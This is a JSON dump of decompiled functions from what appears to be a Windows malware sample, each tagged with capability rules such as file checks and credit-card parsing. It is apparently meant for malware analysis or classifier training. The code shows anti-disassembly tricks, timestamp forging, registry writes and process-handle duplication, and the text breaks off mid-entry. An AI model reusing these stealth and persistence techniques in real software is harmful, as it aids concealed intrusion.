{
    "00401000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401018) overlaps instruction at (ram,0x00401014)\n// \n\nuint __cdecl fcn.00401000(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint in_ECX;\n    int32_t *in_EDX;\n    uint *puVar6;\n    uint *puVar7;\n    uint8_t in_CF;\n    bool bVar8;\n    uint8_t in_AF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    uint uStack8;\n    \n    // [00] -r-x section size 20480 named .text\n    puVar6 = &stack0xfffffffc;\n    if ((in_OF != in_SF) || (in_OF == in_SF)) {\n        in_EAX = arg_8h;\n    }\n    *(in_EAX + -0x7ce92414) = in_ST0;\n    uVar3 = in_EAX - 1U;\n    uVar1 = 9 < (uVar3 & 0xf) | in_AF;\n    uVar3 = uVar3 + uVar1 * '\\x06';\n    *in_EDX = *in_EDX + 0x458bdf84;\n    *in_EDX = *in_EDX | in_ECX >> 8;\n    iVar4 = (*_sym.imp.MSVCRT.dll__access)\n                      (in_EAX - 1U & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | in_CF | uVar1 * (0xf9 < uVar3)) * '`'\n                      );\n    bVar8 = (POPCOUNT(iVar4 + 1U & 0xff) & 1U) != 0;\n    if (iVar4 + 1U != 0) {\n        if ((bVar8) && (!bVar8)) {\n            puVar7 = &stack0xfffffff4;\n            cVar2 = '\\x1e';\n            do {\n                puVar6 = puVar6 + -1;\n                puVar7 = puVar7 + -1;\n                *puVar7 = *puVar6;\n                cVar2 = cVar2 + -1;\n            } while ('\\0' < cVar2);\n            uVar5 = in(0x78);\n            return uVar5;\n        }\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 574
    },
    "00401130": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401220) overlaps instruction at (ram,0x0040121b)\n// \n\nuint fcn.00401130(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uchar *puVar5;\n    uint *puVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint *puVar10;\n    bool bVar11;\n    char cStack560;\n    uint uStack559;\n    uchar uStack300;\n    uint uStack299;\n    uchar auStack40 [36];\n    \n    puVar5 = &stack0xfffffffc;\n    cStack560 = '\\0';\n    uStack300 = '\\0';\n    puVar6 = &uStack559;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &uStack300 + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&cStack560, 0x104);\n    uVar3 = 0xffffffff;\n    pcVar8 = &cStack560;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar6 = pcVar7 + -uVar3;\n    puVar10 = &uStack300;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar8 = 0x4111c8;\n    do {\n        pcVar7 = pcVar8;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar7 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar8 = &uStack300;\n    do {\n        pcVar9 = pcVar8;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar9 = pcVar8 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar9;\n    } while (cVar1 != '\\0');\n    puVar6 = pcVar7 + -uVar3;\n    puVar10 = pcVar9 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    uVar3 = uVar3 & 3;\n    bVar11 = uVar3 == 0;\n    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar10 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    if ((bVar11) || (!bVar11)) {\n        (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&uStack300, 0, auStack40);\n    }\n    else {\n        param_2 = param_2 + 1;\n        puVar5 = &stack0xfffffffd;\n        (**0x6a)();\n        *(extraout_ECX + -1) = *(extraout_ECX + -1) + extraout_DL;\n    }\n    iVar2 = param_2;\n    if ((param_2 == -1) && (iVar2 = fcn.00401980(*(puVar5 + 8)),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, puVar5 + -0x20, puVar5 + -0x18, puVar5 + -0x10);\n    if (param_2 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1277
    },
    "00401340": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00401340(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402300(0x80000002, 0x411470, 0x4114b0, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 150
    },
    "00401790": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401836) overlaps instruction at (ram,0x00401833)\n// \n\nint32_t fcn.00401790(void)\n\n{\n    int32_t iVar1;\n    ushort extraout_CX;\n    char cVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    uint32_t uVar4;\n    code *pcVar5;\n    char *pcVar6;\n    ushort in_SS;\n    ulong uVar7;\n    \n    uVar7 = fcn.00401980(0x411190);\n    uVar3 = uVar7 >> 0x20;\n    iVar1 = uVar7;\n    if (iVar1 == -1) {\n        return 0;\n    }\n    if ((iVar1 != -1) || (iVar1 == -1)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        iVar1 = 1;\n    }\n    else {\n        uVar4 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n        unaff_EBX = unaff_EBP + 0x15ff5076;\n        if (uVar4 < 0) {\n            *(unaff_EBP + -0xc) = uVar3;\n            *(unaff_EBP + -4) = unaff_EBX;\n            *(unaff_EBP + -8) = uVar3;\n            pcVar5 = _sym.imp.MSVCRT.dll_sprintf;\n            if ((uVar4 == 0) || (unaff_EBX = uVar3,  uVar4 != 0)) {\n                uVar3 = unaff_EBX;\n                unaff_ESI = *(unaff_EBP + 8);\n                (*_sym.imp.MSVCRT.dll_sprintf)(unaff_EBP + -0x160, 0x41120c, unaff_ESI);\n            }\n            else {\n                pcVar5 = CONCAT22(extraout_CX, in_SS);\n                *(uVar3 + 0x4060f83d) = *(uVar3 + 0x4060f83d) | extraout_CX;\n                cVar2 = uVar7 >> 0x20;\n                unaff_ESI[-0x73] = unaff_ESI[-0x73] + cVar2;\n                *0xfffffffe = *0xfffffffe + cVar2;\n            }\n            (*pcVar5)(unaff_EBP + -0x264);\n            *(unaff_EBP + -0x20) = unaff_EBP + -0x160;\n            *(unaff_EBP + -0x18) = unaff_EBP + -0xc;\n            *(unaff_EBP + -0x14) = unaff_EBP + -4;\n            *(unaff_EBP + -0x10) = unaff_EBP + -8;\n            uVar4 = 0xffffffff;\n            pcVar6 = unaff_EBP + -0x160;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar2 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar2 != '\\0');\n            *(unaff_EBP + -0x48) = ~uVar4 - 1;\n            uVar4 = 0xffffffff;\n            pcVar6 = unaff_ESI;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar2 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar2 != '\\0');\n            *(unaff_EBP + -0x34) = 0x41124c;\n            *(unaff_EBP + -0x30) = 0x411258;\n            *(unaff_EBP + -0x2c) = 0x411264;\n            *(unaff_EBP + -0x28) = 0x411274;\n            *(unaff_EBP + -0x24) = 0x41127c;\n            *(unaff_EBP + -0x5c) = 2;\n            *(unaff_EBP + -0x58) = 1;\n            *(unaff_EBP + -0x54) = 4;\n            *(unaff_EBP + -0x50) = 4;\n            *(unaff_EBP + -0x4c) = 4;\n            *(unaff_EBP + -0x1c) = unaff_ESI;\n            *(unaff_EBP + -0x44) = ~uVar4 - 1;\n            *(unaff_EBP + -0x40) = 4;\n            *(unaff_EBP + -0x3c) = 4;\n            *(unaff_EBP + -0x38) = 4;\n            pcVar5 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n            if (uVar3 < 5) {\n                uVar3 = uVar3 * 4;\n                do {\n                    iVar1 = (*pcVar5)(0x80000002, unaff_EBP + -0x264, *(unaff_EBP + -0x34 + uVar3), \n                                      *(unaff_EBP + -0x5c + uVar3));\n                    if (iVar1 != 0) {\n                        return 0;\n                    }\n                    uVar3 = uVar3 + 4;\n                } while (uVar3 < 0x14);\n            }\n            return 1;\n        }\n    }\n    *(iVar1 + 2) = *(iVar1 + 2) + (unaff_EBX >> 8);\n    return iVar1 + 1;\n}\n",
        "token_count": 1302
    },
    "00402140": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040218c)\n// WARNING: Removing unreachable block (ram,0x00402194)\n\nuint __cdecl fcn.00402140(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x423638)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x42363c)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x0040220f:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_124h;\n            goto code_r0x0040220f;\n        }\n        iVar2 = (**0x423640)(iVar1, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 374
    },
    "004029a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a67) overlaps instruction at (ram,0x00402a65)\n// \n// WARNING: Removing unreachable block (ram,0x00402a09)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004029a0(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar4;\n    ushort extraout_DX;\n    char *unaff_EBX;\n    uchar *unaff_ESI;\n    char **unaff_EDI;\n    char **ppcVar5;\n    uint *puVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    int64_t iVar10;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    if ((0x7f < &stack0xfffffffc && *0x10 != 0x84) && (0x7f >= &stack0xfffffffc || *0x10 == 0x84)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar2 = fcn.00402c70();\n    if (iVar2 == 0) {\n        return false;\n    }\n    uVar1 = unaff_EDI + 0x2562;\n    cVar9 = '\\0';\n    cVar8 = (uVar1 & 0xffffff00 | uVar1 | 0x4c | extraout_ECX) < 0;\n    pcVar3 = fcn.00402220();\n    ppcVar5 = unaff_EDI;\n    if ((cVar9 == cVar8) && (cVar9 != cVar8)) {\n        out(0xc4, pcVar3);\n        ppcVar5 = unaff_EDI + 1;\n        *unaff_EDI = pcVar3;\n    }\n    iVar2 = fcn.00402140(0x4111f4);\n    bVar7 = iVar2 == -1;\n    if (!bVar7) {\n        return false;\n    }\n    fcn.00404810();\n    *0x423668 = 1;\n    if ((!bVar7) && (bVar7)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    iVar10 = fcn.00401790();\n    iVar2 = iVar10;\n    if (iVar2 != 0) {\n        return false;\n    }\n    if ((iVar2 < 0) || (iVar4 = extraout_ECX_00,  iVar2 >= 0)) {\n        iVar4 = 7;\n        iVar10 = (iVar10 >> 0x20 & 0xffffff00) << 0x20;\n        ppcVar5 = &var_1fh;\n        var_20h = 0;\n    }\n    pcVar3 = iVar10 >> 0x20;\n    cVar8 = iVar10 >> 0x20;\n    *pcVar3 = *pcVar3 + cVar8;\n    *unaff_EBX = *unaff_EBX + (iVar10 >> 8);\n    var_80h._0_1_ = iVar10;\n    for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *ppcVar5 = pcVar3;\n        ppcVar5 = ppcVar5 + 1;\n    }\n    *ppcVar5 = iVar10 >> 0x20;\n    *(ppcVar5 + 2) = cVar8;\n    puVar6 = &var_80h + 1;\n    var_60h._0_1_ = var_80h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &var_60h + 1;\n    var_40h._0_1_ = var_80h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &var_40h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    iVar2 = fcn.00403bb0(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = fcn.00401a70(&var_20h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = fcn.00401d50(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar2 != 0;\n}\n",
        "token_count": 1231
    },
    "004039d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a77) overlaps instruction at (ram,0x00403a6e)\n// \n// WARNING: Removing unreachable block (ram,0x00403ae5)\n// WARNING: Removing unreachable block (ram,0x00403af1)\n\nvoid fcn.004039d0(uint param_1, uint param_2, int32_t param_3, int32_t param_4, char *param_5, int32_t param_6, \n                 int32_t param_7)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint8_t uVar5;\n    int32_t extraout_EDX;\n    uint *puVar6;\n    uchar uVar7;\n    uchar uVar8;\n    bool bVar9;\n    float10 extraout_ST0;\n    ulong uVar10;\n    int32_t in_stack_fffffe94;\n    int32_t in_stack_fffffe98;\n    uint in_stack_fffffe9c;\n    int32_t in_stack_fffffeac;\n    int32_t in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    uint uStack272;\n    uchar auStack13 [4];\n    uint uStack9;\n    \n    uVar7 = &stack0xfffffffc < 0x10c;\n    bVar9 = SBORROW4(&stack0xfffffffc, 0x10c);\n    uVar8 = *0x10 == 0x110;\n    uVar2 = fcn.00403d10(param_5, param_6, param_1, 0x20, param_7 + 0x20);\n    if ((!bVar9) && (bVar9)) {\n        LOCK();\n        param_7 = 0x138b2633;\n        uVar7 = 0x9a70ae80 < uVar2;\n        uVar8 = uVar2 == 0x9a70ae81;\n    }\n    fcn.00403d10(param_5, param_6, param_2, 0x20, param_7 + 0x60);\n    if ((uVar7 || uVar8) || (uVar2 = extraout_ECX,  iVar4 = extraout_EDX,  !uVar7 && !uVar8)) {\n        uVar2 = param_7 + 0xa0;\n        in_stack_fffffeb4 = 0x20;\n        iVar4 = param_3;\n        in_stack_fffffeac = param_6;\n        in_stack_fffffeb0 = param_3;\n    }\n    cVar1 = *param_5;\n    *(param_6 + -0x75) = *(param_6 + -0x75) - &stack0xfffffeac;\n    pcVar3 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) - cVar1, uVar2)) + 0x6a;\n    *pcVar3 = *pcVar3 + iVar4;\n    bVar9 = false;\n    *(iVar4 + 0x57) = *(iVar4 + 0x57) & iVar4;\n    uVar10 = fcn.00403d10(param_5, &stack0xfffffffc, in_stack_fffffeac, in_stack_fffffeb0, in_stack_fffffeb4);\n    uVar5 = uVar10 >> 0x20;\n    if ((bVar9) || (iVar4 = extraout_ECX_00,  !bVar9)) {\n        uVar10 = CONCAT44(param_7 + 0xe0, param_7 + 0xe0);\n        in_stack_fffffe9c = 0x20;\n        iVar4 = param_4;\n        in_stack_fffffe94 = param_6;\n        in_stack_fffffe98 = param_4;\n    }\n    uVar2 = uVar10 + 0x7c8ecb0d + (bVar9 == false);\n    *(param_7 + 0x43d1773a) = *(param_7 + 0x43d1773a) ^ 0x8b27e95e;\n    cVar1 = uVar2 >> 8;\n    pcVar3 = uVar2 & 0xffff0000 | CONCAT11(uVar2 + -0x73, cVar1);\n    *pcVar3 = *pcVar3 + cVar1;\n    pcVar3[0x6a] = pcVar3[0x6a] + uVar5;\n    *(iVar4 + 0x57) = *(iVar4 + 0x57) & uVar5;\n    fcn.00403d10(param_5, in_stack_fffffe94, in_stack_fffffe98, in_stack_fffffe9c, uVar10 >> 0x20);\n    iVar4 = fcn.00403980();\n    if (iVar4 == -1) {\n        iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(param_7 + 0x120) = iVar4 % 5;\n    }\n    else {\n        *(param_7 + 0x120) = iVar4;\n    }\n    puVar6 = &uStack272;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    uStack9 = 0x104;\n    *(puVar6 + 2) = 0;\n    iVar4 = fcn.00402300(0x80000001, 0x4113d8, 0x411404, auStack13, &stack0xfffffeef, &uStack9);\n    if (iVar4 != 0) {\n        if ((-1 < iVar4) && (-1 >= iVar4)) {\n            *(puVar6 + 0x1f) = extraout_ST0;\n            param_7 = param_7 + 5;\n        }\n        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (iVar4 == 0) {\n            *(param_7 + 0x120) = *(param_7 + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 1442
    },
    "00404f10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404fb4) overlaps instruction at (ram,0x00404fb3)\n// \n// WARNING: Removing unreachable block (ram,0x00404fa4)\n\nuint __cdecl fcn.00404f10(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t in_ECX;\n    int32_t *piVar6;\n    char *unaff_EBX;\n    int32_t unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    bool bVar7;\n    float10 extraout_ST0;\n    uint in_stack_fffffff4;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        in_stack_fffffff4 = 0x4111fc;\n    }\n    else {\n        piVar6 = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - *unaff_EBX, in_ECX);\n        puVar1 = unaff_EDI + 0x68;\n        puVar2 = *puVar1;\n        *puVar1 = *puVar1 - &stack0xfffffff8;\n        *piVar6 = *piVar6 + in_EAX + (puVar2 < &stack0xfffffff8);\n    }\n    iVar3 = fcn.00402140(in_stack_fffffff4);\n    bVar7 = -1 < iVar3 + 1;\n    if (iVar3 == -1) {\n        return 0;\n    }\n    if ((bVar7) && (!bVar7)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0);\n    if (iVar3 != 0) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar3, 0, 0, 0, 2);\n        iVar5 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar4);\n        if (iVar5 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 540
    },
    "00404fd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404fd0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_4h;\n    \n    *0x423664 = fcn.00401340();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &var_4h, 0);\n    if (iVar1 != 0) {\n        if (*0x423664 != 0) {\n            iVar1 = fcn.00404f10(arg_8h_00);\n            *0x423664 = iVar1 == 0;\n        }\n        fcn.00401130(0, arg_8h_00);\n        if (*0x423664 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 310
    },
    "00401060": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401060(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        do {\n            arg_8h = arg_8h + *arg_ch;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 194
    },
    "00404020": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040414b) overlaps instruction at (ram,0x0040414a)\n// \n\nuint * __cdecl fcn.00404020(uint arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint32_t extraout_ECX;\n    uint16_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint *unaff_EDI;\n    bool in_CF;\n    bool bVar9;\n    char cVar10;\n    char cVar11;\n    ulong uVar12;\n    uint32_t uStack00000014;\n    uint uStack00000018;\n    uint32_t uStack0000001c;\n    \n    if (!in_CF) {\n        if (in_CF) {\n            if (&stack0xfffffff0 < *in_EAX || in_EAX + 1U == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uStack00000014 = in_EAX + 1U & 0xffffff20;\n            uStack00000018 = 0x411610;\n            uStack0000001c = uStack00000014;\n            puVar2 = (*_sym.imp.USER32.dll_RegisterClassExA)(0xb7f8c08b);\n            return puVar2;\n        }\n    }\n    uVar3 = fcn.00401060(0, arg_8h, arg_ch + 1U >> 1);\n    puVar2 = uVar3 & 0xffff;\n    cVar11 = SBORROW4(unaff_EDI, puVar2);\n    cVar10 = unaff_EDI - puVar2 < 0;\n    uVar12 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    puVar4 = uVar12 >> 0x20;\n    puVar8 = uVar12;\n    if (cVar11 == cVar10) {\n        uVar3 = extraout_ECX;\n        if (cVar11 == cVar10) goto code_r0x00404086;\n    }\n    else {\ncode_r0x00404086:\n        uVar3 = puVar8[0x16];\n    }\n    if (puVar2 < uVar3) {\n        bVar9 = false;\n        iVar7 = (puVar2 - uVar3 & 0xffff) - 1;\n    }\n    else {\n        puVar4 = uVar3 & 0xffff;\n        bVar9 = puVar2 < puVar4;\n        iVar7 = puVar2 - puVar4;\n    }\n    if (!bVar9) {\n        if (bVar9) {\n            out(0xbd, puVar4);\n            return puVar4;\n        }\n    }\n    uVar5 = uVar3 >> 0x10;\n    uVar1 = uVar3 >> 0x10;\n    uVar6 = iVar7;\n    if (uVar6 < uVar1) {\n        if ((uVar1 < uVar6) && (uVar6 <= uVar1)) {\n            uVar5 = uVar5 & 0xe2f4cc58;\n        }\n        iVar7 = (iVar7 - uVar5 & 0xffff) - 1;\n    }\n    else {\n        iVar7 = iVar7 - uVar5;\n    }\n    *arg_14h = iVar7 + arg_ch;\n    if (!SCARRY4(iVar7, arg_ch)) {\n        if (SCARRY4(iVar7, arg_ch)) {\n            *unaff_EDI = *puVar8;\n            arg_10h = 0x8b10558b;\n            puVar8 = puVar8 + 3;\n            goto code_r0x00404151;\n        }\n    }\n    arg_ch = puVar8[0x16];\ncode_r0x00404151:\n    *arg_10h = arg_ch;\n    return puVar8;\n}\n",
        "token_count": 944
    },
    "004014a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401517) overlaps instruction at (ram,0x00401515)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004015c9)\n// WARNING: Removing unreachable block (ram,0x004014c4)\n// WARNING: Removing unreachable block (ram,0x004014ca)\n// WARNING: Removing unreachable block (ram,0x00401517)\n// WARNING: Removing unreachable block (ram,0x00401523)\n// WARNING: Removing unreachable block (ram,0x00401563)\n// WARNING: Removing unreachable block (ram,0x00401572)\n// WARNING: Removing unreachable block (ram,0x00401587)\n// WARNING: Removing unreachable block (ram,0x0040157a)\n// WARNING: Removing unreachable block (ram,0x0040158d)\n// WARNING: Removing unreachable block (ram,0x00401593)\n// WARNING: Removing unreachable block (ram,0x004015a3)\n// WARNING: Removing unreachable block (ram,0x004015ad)\n// WARNING: Removing unreachable block (ram,0x004015bb)\n// WARNING: Removing unreachable block (ram,0x004015c5)\n// WARNING: Removing unreachable block (ram,0x004015c8)\n// WARNING: Removing unreachable block (ram,0x004015ce)\n// WARNING: Removing unreachable block (ram,0x004015d7)\n// WARNING: Removing unreachable block (ram,0x004015d8)\n// WARNING: Removing unreachable block (ram,0x004015dc)\n// WARNING: Removing unreachable block (ram,0x004014cd)\n// WARNING: Removing unreachable block (ram,0x00401670)\n// WARNING: Removing unreachable block (ram,0x0040167e)\n// WARNING: Removing unreachable block (ram,0x0040168a)\n// WARNING: Removing unreachable block (ram,0x004016e5)\n// WARNING: Removing unreachable block (ram,0x0040160a)\n// WARNING: 